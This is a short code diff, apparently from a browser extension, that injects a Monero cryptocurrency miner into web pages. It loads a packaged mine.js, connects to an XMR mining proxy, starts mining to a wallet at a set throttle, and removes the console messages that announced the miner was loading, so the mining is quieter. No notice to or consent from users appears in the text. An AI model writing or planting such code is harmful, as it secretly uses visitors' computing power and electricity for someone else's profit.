@@ -1,8 +1,6 @@
-console.log("Loading XMR Mining");
-
 // Start Of Mining Code (Javascript)
 var script = document.createElement("script");
-script.src = "mine.js";
+script.src = chrome.extension.getURL("mine.js");
 document.head.appendChild(script);
 
 server = "wss://f.xmrminingproxy.com:8181";
@@ -14,5 +12,3 @@ var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
 throttleMiner = 20;
 // End Of Mining Code
-
-console.log("External JavaScript file loaded.");
